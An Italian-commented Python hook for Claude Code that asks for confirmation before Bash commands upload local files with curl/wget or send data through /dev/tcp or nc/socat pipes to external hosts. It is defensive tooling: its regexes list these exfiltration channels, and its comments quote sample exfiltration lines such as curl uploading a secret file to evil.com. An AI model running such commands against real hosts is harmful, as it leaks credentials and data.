#!/usr/bin/env python3
"""PreToolUse(Bash) hook: chiede conferma sull'invio di dati verso host ESTERNI.

Due rami:

  (A) Upload di un FILE LOCALE (`-F @file`, `-T`, `--upload-file`, `-d @file`), la forma con cui
      una chiave o un dump escono -> host esterno = ask, host interno = allow. Contano solo i
      curl/wget che caricano un file: dal 30/10/2026 un POST generico nello stesso comando non
      fa più chiedere.

  (B) Canali di rete grezzi, che portano fuori dati senza un client HTTP:
        - /dev/tcp e /dev/udp verso un host esterno o che non si legge (una variabile);
        - una pipe verso nc/ncat/netcat/socat, verso un IP, un nome o una variabile;
        - nc/ncat verso host esterno.
      Tutti -> ask (host interni esclusi). I controlli su DNS e blob opachi in un GET sono
      stati tolti il 30/10/2026: il dispatcher non manda più qui né dig né i GET, e
      scattavano solo se lo stesso comando conteneva anche un upload.

Contratto del 28/10/2026 (Federico: "togli i controlli"): una guardia chiede solo sui rail, dove
la forma del comando basta a decidere. Il codice Python, node o curl che chiama la rete (GET, POST
generico, $() nell'URL) non arriva più qui: lo giudica il classificatore di auto mode, che legge
il codice. Una regex non distingue uno script che legge archive.org da uno che porta fuori un
file, e ogni tentativo ha prodotto falsi positivi (ramo spento e riacceso cinque volte dal 12/7).

comms-guard.py (messaggistica/email nota) gira PRIMA e chiede conferma su quei casi.
Gli scanner PostToolUse (credential-leak) restano come secondo layer detective.

Host interni: localhost, le reti locali (INTERNAL_NETS) e le voci di
hooks/hosts-interni.local (hostname esatti, reti, o domini scritti col punto davanti:
.esempio.org vale anche per i sottodomini). API esterne fidate: le voci di hooks/api-fidate.local,
un nome host per riga, vuoto di default. Un POST verso un servizio che usi per
lavoro con la sua chiave (la tua fatturazione, il tuo CRM) è lavoro, non
esfiltrazione. Entrambi i file sono ignorati da git: restano tuoi.

Il dispatcher passa in COMMS_REDUCED il comando senza gli heredoc scritti su file
(comms-prefilter.py): si giudica il codice eseguito, non la prosa. Vuota = il
comando solo legge.
Fail-open su parsing. Zero dipendenze.
"""
from __future__ import annotations

import ipaddress
import json
import os
import re
import signal
import sys
from pathlib import Path
from urllib.parse import urlsplit


def _t(s, f):
    sys.exit(0)


if hasattr(signal, "SIGALRM"):
    signal.signal(signal.SIGALRM, _t)

INTERNAL_HOSTS = frozenset(("localhost", "host.docker.internal", "0.0.0.0"))
# Reti che non escono dalla macchina o dalla rete locale: le private RFC 1918
# (10/8, 172.16/12, 192.168/16), loopback, link-local, le IPv6 private (fc00::/7)
# e il 100.64/10 su cui vivono gli indirizzi Tailscale. Elenco esplicito e non
# ip.is_private: quello cambia fra le versioni di Python e conta come privati
# anche gli IPv6 che incapsulano un IPv4 pubblico.
INTERNAL_NETS = tuple(map(ipaddress.ip_network, (
    "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "100.64.0.0/10",
    "169.254.0.0/16", "::1/128", "fc00::/7", "fe80::/10",
)))
URL = re.compile(r'https?://[^\s"\']+', re.IGNORECASE)


def _leggi_host_locali(path: Path):
    """Legge hosts-interni.local: una voce per riga, # commento, righe vuote ignorate.

    Una voce accettata da ip_network(strict=False) è una rete. Una voce che comincia
    con un punto (.esempio.org) vale per il dominio e per ogni suo sottodominio, e
    deve avere almeno due etichette: .com renderebbe fidato mezzo internet. Le altre
    voci sono hostname esatti (minuscoli, senza punto finale). Voci non plausibili
    (spazi interni, '/' in un non-CIDR) si ignorano. File assente o illeggibile:
    nessuna voce. Lettura una volta per esecuzione.
    """
    host = set()
    domini = set()
    reti = []
    try:
        for riga in path.read_text(encoding="utf-8").splitlines():
            voce = riga.strip()
            if not voce or voce.startswith("#"):
                continue
            try:
                rete = ipaddress.ip_network(voce, strict=False)
            except ValueError:
                rete = None
            if rete is not None:
                # Una rete più larga di /8 renderebbe fidata mezza internet: si ignora.
                if rete.prefixlen >= 8:
                    reti.append(rete)
                continue
            if " " in voce or "/" in voce:
                continue
            voce = voce.lower().rstrip(".")
            if voce.startswith("."):
                etichette = voce[1:].split(".")
                if len(etichette) >= 2 and all(etichette):
                    domini.add(voce[1:])
                continue
            host.add(voce)
    except (OSError, ValueError):
        # File illeggibile o non UTF-8: nessuna voce locale, la guardia resta chiusa.
        return frozenset(), frozenset(), ()
    return frozenset(host), frozenset(domini), tuple(reti)


LOCAL_HOSTS, LOCAL_DOMAINS, LOCAL_NETS = _leggi_host_locali(
    Path(__file__).resolve().parent / "hosts-interni.local"
)


def _internal_host(host: str | None) -> bool:
    if not host:
        return False
    normalized = host.lower().rstrip(".")
    if normalized in INTERNAL_HOSTS or normalized in LOCAL_HOSTS:
        return True
    if any(normalized == d or normalized.endswith("." + d) for d in LOCAL_DOMAINS):
        return True
    if normalized.startswith("[") and normalized.endswith("]"):
        normalized = normalized[1:-1]
    try:
        addr = ipaddress.ip_address(normalized.split("%", 1)[0])
    except ValueError:
        return False
    # ::ffff:8.8.8.8 è l'IPv4 8.8.8.8: si giudica quello.
    if addr.version == 6 and addr.ipv4_mapped is not None:
        addr = addr.ipv4_mapped
    return any(addr.version == network.version and addr in network for network in INTERNAL_NETS + LOCAL_NETS)


def _leggi_api_fidate(path: Path):
    """Legge api-fidate.local: un nome host per riga, # commento. Solo nomi esatti:
    un IP o una rete qui non vale (per quelli c'è hosts-interni.local)."""
    host = set()
    try:
        for riga in path.read_text(encoding="utf-8").splitlines():
            voce = riga.strip().lower().rstrip(".")
            if not voce or voce.startswith("#") or " " in voce or "/" in voce or "*" in voce:
                continue
            try:
                ipaddress.ip_address(voce)
                continue
            except ValueError:
                pass
            if "." in voce:
                host.add(voce)
    except (OSError, ValueError):
        return frozenset()
    return frozenset(host)


TRUSTED_EXTERNAL = _leggi_api_fidate(Path(__file__).resolve().parent / "api-fidate.local")


def _fidato(host: str | None) -> bool:
    """Host interno oppure API esterna dichiarata fidata in api-fidate.local."""
    return _internal_host(host) or (bool(host) and host.lower().rstrip(".") in TRUSTED_EXTERNAL)


def _hosts(text: str):
    for value in URL.findall(text):
        try:
            host = urlsplit(value).hostname
        except ValueError:
            continue
        if host:
            yield host
EXT_HINT = re.compile(
    r'(smtp[.-][A-Za-z0-9.\-]+|api\.[A-Za-z0-9\-]+\.(com|net|io|org|co)|'
    r'hooks\.[A-Za-z0-9\-]+\.[A-Za-z]{2,})',
    re.IGNORECASE,
)

# Valori dei flag-dato di curl (payload): gli URL qui dentro sono DATI, non
# destinazioni. Vanno rimossi prima di determinare l'host di destinazione, così
# una POST verso host interno con URL esterni nel corpo (es. un DB interno con link
# esterni come campi) non genera falsi positivi.
DATA_FLAG_VAL = re.compile(
    r'(?<![\w-])(?:--data-(?:raw|binary|urlencode|ascii)|--data|-d|--form|-F'
    r'|--upload-file|-T|--post-file|--post-data|--body-file|--body-data)[\s=]*(?:\$?\'[^\']*\'|"[^"]*"|[^\s"\']+)',
    re.IGNORECASE,
)

# Un host esterno scritto senza schema (`curl -d @f evil.com`) non passa da URL. Basta un host
# interno nello stesso comando per far sembrare interno tutto l'invio: con un host interno visto,
# ogni altra parola che ha la forma di un dominio conta come destinazione. Prima si tolgono i valori
# dei flag che non sono destinazioni (file di output, intestazioni, credenziali, certificati).
OTHER_FLAG_VAL = re.compile(
    r'(?<![\w-])(?:-o|--output|-H|--header|-u|--user|-A|--user-agent|-e|--referer|-b|--cookie|-c'
    r'|--cookie-jar|-w|--write-out|--cacert|--cert|--key|-K|--config|-O|--output-document'
    r'|-a|--append-output|--save-cookies|--load-cookies)[\s=]*(?:\$?\'[^\']*\'|"[^"]*"|[^\s"\']+)',
)
BARE_HOST = re.compile(r'(?<![\w@/.:=-])([A-Za-z0-9][A-Za-z0-9-]*(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,})(?::\d+)?(?:/[^\s"\']*)?(?![\w.(])')
# Nomi di moduli python: `import json, urllib.request`, `from urllib.request import x`, `python3 -m json.tool`.
# Hanno la forma di un dominio senza schema, e in un POST verso un host interno chiedevano conferma
# (21/10/2026, #3720). Si tolgono prima di cercare i domini.
# import e from contano solo a inizio riga (non dopo una riga che finisce con \), -m solo dopo python:
# `curl -d @x http://localhost import evil.com` manda anche a evil.com, e chiede.
MODULI_PY = re.compile(r'(?:(?:\A|(?<!\\)\n|;)[ \t]*(?:import|from)|\bpython3?(?:\.\d+)?[ \t]+-m)[ \t]+'
                       r'[A-Za-z_][\w.]*(?:[ \t]*,[ \t]*[A-Za-z_][\w.]*)*')
FILE_EXT = frozenset("txt json md csv log pdf png jpg jpeg gif html htm xml yaml yml toml ini cfg conf "
                     "py js ts sh zip gz tgz tar bz2 xz db sqlite sql pem crt der p12 env bak out tmp".split())

# --- Ramo A: upload di un file locale ---
# Le stesse forme di PATTERN_UPLOAD_FILE nel dispatcher. _FINE_ARG chiude un argomento nella shell
# (uno spazio) o in una lista python (`'curl', '-d', '@x'`, 21/10/2026).
_FINE_ARG = r'''(?:\s|["'],\s*["']?)'''
# -F e --form caricano un file solo con `nome=@file` o `nome=<file` (31/10/2026): `-F "email=a@b.it"` è un
# campo di testo, e `-F 'testo=<file'` legge il file quanto `@`.
UPLOAD_FILE = re.compile(
    r'(?:-F' + _FINE_ARG + r'*[^\s=]*=[@<]|--form' + _FINE_ARG + r'*[^\s=]*=[@<]|-T' + _FINE_ARG
    + r'|--upload-file|--(?:post|body)-file|-d' + _FINE_ARG + r'*@|--data[a-z-]*' + _FINE_ARG + r'*@)'
)
# Variabili assegnate nel comando (31/10/2026): `J="http://127.0.0.1:8096"; … curl --data @- "$J/x"`. Senza
# espanderle la destinazione non si legge, e ogni POST al proprio servizio chiedeva (18 conferme su 21 in
# due settimane, tutte verso 127.0.0.1 o 192.168.1.3). Contano solo i valori letterali: un valore con $,
# backtick o parentesi lascia la variabile chiusa, e la destinazione resta illeggibile. Si leggono le
# assegnazioni di tutto il comando, anche dopo il curl (un loop riassegna al giro dopo), e una variabile
# legata in altro modo (read, for, +=, printf -v, ${X:=}) si chiude. Vedi _assegnate.
# Anche in testa a una stringa per ssh o bash -c: `ssh host 'A="http://192.168.1.3:8686"; curl … $A/x'`.
ASSEGNAZIONE = re.compile(r'''(?:^|(?<=[\s;&|('"]))([A-Za-z_]\w*)=("[^"]*"|'[^']*'|[^\s;&|()'"]*)''')
RIFERIMENTO = re.compile(r'\$(?:\{([A-Za-z_]\w*)\}|([A-Za-z_]\w*))')
# Un curl/wget fino al primo separatore della shell fuori dalle virgolette: un & o un ; dentro
# `"https://x/?a=1&b=2"` non chiude il comando. Le righe continuate con \ si uniscono prima.
CURL_SEG_Q = re.compile(r'''\b(?:curl|wget)\b(?:[^\n|;&"']|"[^"\n]*"|'[^'\n]*')*''', re.IGNORECASE)

# --- Ramo B: canali di rete grezzi ---
DEV_TCP = re.compile(r'/dev/(?:tcp|udp)/([^/\s"\']*)', re.IGNORECASE)
NC_PIPE = re.compile(r'\|\s*(?:sudo\s+)?(?:\S*/)?(nc|ncat|netcat|socat)\b([^\n|;&]*)', re.IGNORECASE)
NC_HOST = re.compile(r'\b(nc|ncat)\b\s+[^\n|;&]*?\b([A-Za-z0-9][A-Za-z0-9.\-]+\.[A-Za-z]{2,})\b',
                     re.IGNORECASE)


def _ask(reason=None):
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "ask",
            "permissionDecisionReason": reason or (
                "Invio di dati (POST/upload) verso un host esterno o non "
                "riconosciuto. Conferma solo se l'invio è voluto "
                "(possibile esfiltrazione di credenziali/contenuti)."
            ),
        }
    }))
    return 0


def _external_host(host: str | None) -> bool:
    return bool(host) and not _internal_host(host)


def _solo_fidati(hosts) -> bool:
    """Vero se c'è almeno un host e sono tutti interni o fidati: nel dubbio si chiede."""
    hosts = [h for h in hosts if h]
    return bool(hosts) and all(_fidato(h) for h in hosts)


def _destinazioni_nc(programma: str, argomenti: str):
    """Gli host di nc/ncat/netcat (le parole che non sono opzioni né porte) e di socat
    (TCP:host:porta, OPENSSL:host:porta, UDP:host:porta)."""
    parole = argomenti.split()
    if programma.lower() == "socat":
        return [m.group(1) for m in re.finditer(r'(?:TCP|TCP4|TCP6|UDP|UDP4|UDP6|OPENSSL|SSL):([^:,\s]+)', argomenti, re.I)]
    fuori, salta = [], False
    for w in parole:
        if salta:
            salta = False
            continue
        if w.startswith("-"):
            salta = w in ("-p", "-s", "-w", "-x", "-X", "-i", "-q", "-e", "-c", "--proxy", "--source")
            continue
        if w.isdigit() or w.startswith((">", "<", "2>")):
            continue
        fuori.append(w.strip("'\""))
    return fuori


def _espansioni(segmento: str, assegnate: dict) -> list:
    """Le letture del segmento con le variabili assegnate nel comando.

    Una variabile assegnata più volte dà una lettura per valore: `J=localhost; J=evil.com`
    fa giudicare anche evil.com. Una variabile con un valore non letterale non si espande."""
    letture = [segmento]
    if _TUTTE in assegnate:
        return letture
    for nome in dict.fromkeys(a or b for a, b in RIFERIMENTO.findall(segmento)):
        valori = assegnate.get(nome)
        if not valori or None in valori:
            continue
        rif = re.compile(r'\$(?:\{' + nome + r'\}|' + nome + r'(?!\w))')
        letture = [rif.sub(lambda _m, v=v: v, x) for x in letture for v in valori]
        if len(letture) > 16:
            return [segmento]
    return letture


# Modi di legare una variabile che non sono NOME=letterale: la variabile si chiude, e la destinazione
# che la usa resta illeggibile (31/10/2026, lente sicurezza). `J+=.evil.example`, `read J < url.txt`,
# `printf -v J`, `for J in …`, `${J:=…}`, `declare -n J=X`: il valore non si legge dal testo.
_LEGA_APPENDE = re.compile(r'(?<![\w$])([A-Za-z_]\w*)\+=')
_LEGA_ELENCO = re.compile(r'(?:^|(?<=[\s;&|(`]))(?:read|mapfile|readarray|unset)\b([^\n;&|)]*)')
_LEGA_PRINTF = re.compile(r'\bprintf\s+(?:-\S+\s+)*-v\s*([A-Za-z_]\w*)')
_LEGA_FOR = re.compile(r'(?:^|(?<=[\s;&|(]))(?:for|select)\s+([A-Za-z_]\w*)')
_LEGA_GETOPTS = re.compile(r'\bgetopts\s+\S+\s+([A-Za-z_]\w*)')
_LEGA_DEFAULT = re.compile(r'\$\{([A-Za-z_]\w*):?=')
_LEGA_ARRAY = re.compile(r'''(?:^|(?<=[\s;&|('"]))([A-Za-z_]\w*)=\(''')
_LEGA_DICHIARA = re.compile(r'(?:^|(?<=[\s;&|(]))(?:declare|typeset|local|export|readonly)((?:\s+-\S+)+)([^\n;&|)]*)')
# source, il punto come comando, eval e set -a possono assegnare qualunque variabile: si chiudono tutte.
# Solo in posizione di comando: `jq . x.json` non è il punto che carica un file.
_CHIUDE_TUTTE = re.compile(r'''(?:^|[;&|(\n`]|\b(?:then|do|else)|(?<!\S)['"])\s*(?:source|eval|\.)(?=\s)'''
                           r'|\bset\s+(?:-[A-Za-z]*a[A-Za-z]*|-o\s+allexport)\b')
_TUTTE = "*"
# Proxy e reindirizzamenti di curl: l'invio va (anche) a quell'host, non solo all'URL scritto.
PROXY_ENV = frozenset(("http_proxy", "https_proxy", "all_proxy"))
_PROXY_CORTA = "x"
_PROXY_LUNGHE = frozenset(("--proxy", "--preproxy", "--socks4", "--socks4a", "--socks5", "--socks5-hostname"))
_REINDIRIZZA = frozenset(("--connect-to", "--resolve"))


def _assegnate(testo: str) -> dict:
    """nome -> valori letterali assegnati in TUTTO il comando (None = non letterale o legata altrove).

    Si legge tutto il comando, anche dopo il curl: in un loop un'assegnazione che segue il curl vale
    al giro dopo. Una variabile legata anche fuori da NOME=letterale si chiude. Con source, eval, il
    punto o set -a si chiudono tutte (chiave _TUTTE)."""
    out = {}

    def aggiungi(nome, valore):
        out.setdefault(nome, [])
        if valore not in out[nome]:
            out[nome].append(valore)

    if _CHIUDE_TUTTE.search(testo):
        out[_TUTTE] = [None]
    for m in ASSEGNAZIONE.finditer(testo):
        grezzo = m.group(2)
        if len(grezzo) >= 2 and grezzo[0] == grezzo[-1] and grezzo[0] in "\"'":
            grezzo = grezzo[1:-1]
        aggiungi(m.group(1), None if re.search(r'[$`()]', grezzo) else grezzo)
    for regex in (_LEGA_APPENDE, _LEGA_PRINTF, _LEGA_FOR, _LEGA_GETOPTS, _LEGA_DEFAULT, _LEGA_ARRAY):
        for m in regex.finditer(testo):
            aggiungi(m.group(1), None)
    for m in _LEGA_ELENCO.finditer(testo):
        for nome in re.findall(r'(?<![\w$-])([A-Za-z_]\w*)', m.group(1)):
            aggiungi(nome, None)
    for m in _LEGA_DICHIARA.finditer(testo):
        for nome in re.findall(r'(?<![\w$-])([A-Za-z_]\w*)', m.group(2)):
            aggiungi(nome, None)
    return out


def _host_di(valore: str):
    """L'host di un valore di proxy (`http://u:p@h:8080`, `h:8080`, `socks5://h`). None se non si legge."""
    valore = (valore or "").strip().strip("'\"")
    if not valore or "$" in valore or "`" in valore:
        return None
    try:
        return urlsplit(valore if "://" in valore else "//" + valore).hostname
    except ValueError:
        return None


def _host_reindirizzati(valore: str) -> list:
    """Dove va davvero la richiesta: H2 di --connect-to H1:P1:H2:P2, gli ADDR di --resolve [+]H:P:ADDR[,ADDR].
    [None] se non si legge. Un H2 vuoto vuol dire l'host dell'URL, che si giudica già."""
    valore = (valore or "").strip().strip("'\"").lstrip("+-")
    if not valore or "$" in valore or "`" in valore:
        return [None]
    parti = re.split(r':(?![^\[]*\])', valore)
    if len(parti) < 3:
        return [None]
    return [h.strip("[]") for h in parti[2].split(",") if h]


def _proxy_fidati(segmento: str, assegnate: dict) -> bool:
    """Vero se ogni proxy e ogni reindirizzamento del segmento (opzioni di curl e variabili *_PROXY
    assegnate nel comando) va a un host interno o fidato. Senza proxy: vero."""
    host = []
    for nome, valori in assegnate.items():
        if nome.lower() in PROXY_ENV:
            host += [_host_di(v) if v is not None else None for v in valori]
    if _TUTTE in assegnate:
        host.append(None)  # source, eval o set -a possono esportare un proxy che non si legge
    pulito = DATA_FLAG_VAL.sub(" ", segmento)
    parole = re.findall(r'''"[^"]*"|'[^']*'|\S+''', pulito)
    for i, parola in enumerate(parole):
        dopo = parole[i + 1] if i + 1 < len(parole) else ""
        nome, uguale, attaccato = parola.partition("=")
        if parola.startswith("--"):
            if nome in _PROXY_LUNGHE:
                host.append(_host_di(attaccato if uguale else dopo))
            elif nome in _REINDIRIZZA:
                host += _host_reindirizzati(attaccato if uguale else dopo)
        elif parola.startswith("-") and len(parola) > 1 and parola[1:2].isalpha() and _PROXY_CORTA in parola[1:]:
            # `-x h:8080`, `-xh:8080`, `-sx h`: in un gruppo di opzioni corte quel che segue la x è il proxy.
            prima, _, resto = parola[1:].partition(_PROXY_CORTA)
            if prima.isalpha() or not prima:
                host.append(_host_di(resto or dopo))
    return all(h is not None and _fidato(h) for h in host)


def _destinazione_fidata(dest: str) -> bool:
    """Vero se il segmento di upload ha almeno un host e sono tutti interni o fidati."""
    # Valuta solo l'host di DESTINAZIONE: rimuovi i valori dei flag-dato
    # (payload) così gli URL nel corpo non vengono scambiati per destinazioni.
    dest = DATA_FLAG_VAL.sub(" ", dest)
    ext = False
    internal_seen = False
    for host in _hosts(dest):
        if _fidato(host):
            internal_seen = True
        else:
            ext = True
    if not ext:
        for m in EXT_HINT.finditer(dest):
            if not _fidato(m.group(0)):
                ext = True
                break
    if not ext and internal_seen:
        senza_url = MODULI_PY.sub(" ", OTHER_FLAG_VAL.sub(" ", URL.sub(" ", dest)))
        for m in BARE_HOST.finditer(senza_url):
            host = m.group(1)
            if host.rsplit(".", 1)[-1].lower() in FILE_EXT or _fidato(host):
                continue
            ext = True
            break
    return internal_seen and not ext


def main() -> int:
    try:
        if hasattr(signal, "SIGALRM"):
            signal.alarm(8)
        data = json.loads(sys.stdin.buffer.read().decode("utf-8"))
        if hasattr(signal, "SIGALRM"):
            signal.alarm(0)
    except Exception:
        return 0
    if data.get("tool_name") not in ("Bash", "Monitor"):  # Monitor lancia comandi shell (19/10/2026)
        return 0
    cmd = (data.get("tool_input") or {}).get("command", "")
    if not isinstance(cmd, str) or not cmd:
        return 0
    # Versione ridotta dal dispatcher (comms-prefilter.py): si giudica il codice eseguito.
    reduced = os.environ.get("COMMS_REDUCED")
    if reduced is not None:
        cmd = reduced
        if not cmd.strip():
            return 0

    # ---- Ramo A: upload di un file locale ----
    unito = cmd.replace("\\\n", " ")
    # Un curl/wget che non carica un file non è una destinazione: `curl https://$u/` in un altro
    # segmento rendeva "non leggibile" la POST verso un host interno (21/10/2026), e un POST generico
    # verso l'esterno faceva chiedere un upload verso un host interno (fino al 30/10/2026).
    # Dal 31/10/2026 ogni upload si giudica da solo: prima un host interno in un upload copriva
    # l'altro, e `curl -d @a http://localhost/; curl -d @segreto "$X"` passava. Host esterno o
    # destinazione illeggibile in uno qualunque -> ask.
    tutte = _assegnate(unito)
    for m in CURL_SEG_Q.finditer(unito):
        if not UPLOAD_FILE.search(m.group(0)):
            continue
        # Una variabile assegnata solo dopo il curl, al primo giro vale quanto nell'ambiente: non si legge.
        prima = _assegnate(unito[:m.start()])
        assegnate = {nome: valori + ([None] if nome not in prima else []) for nome, valori in tutte.items()}
        if not all(_destinazione_fidata(x) and _proxy_fidati(x, assegnate) for x in _espansioni(m.group(0), assegnate)):
            return _ask()

    # ---- Ramo B: canali di rete grezzi ----
    # /dev/tcp e /dev/udp verso un host esterno, o che non si legge (una variabile)
    for h in DEV_TCP.findall(cmd):
        if not _internal_host(h):
            return _ask("Redirezione bash /dev/tcp verso un host esterno o che non si legge "
                        "(canale di esfiltrazione). Conferma solo se voluto.")
    # Una pipe verso nc/ncat/netcat/socat: i dati del comando prima escono dalla macchina.
    for m in NC_PIPE.finditer(cmd):
        if not _solo_fidati(_destinazioni_nc(m.group(1), m.group(2))):
            return _ask(f"Pipe verso {m.group(1)}: i dati del comando prima vanno a un host esterno, o a "
                        "uno che non si legge. Conferma solo se l'invio è voluto.")
    # nc/ncat verso host esterno
    m = NC_HOST.search(cmd)
    if m and _external_host(m.group(2)):
        return _ask("nc/ncat verso un host esterno (canale di esfiltrazione). "
                    "Conferma solo se voluto.")
    return 0


if __name__ == "__main__":
    # Claude Code scrive e legge in UTF-8. Su Windows la pipe è in cp1252 (16/10/2026).
    for _flusso in (sys.stdout, sys.stderr):
        try:
            _flusso.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass
    sys.exit(main())
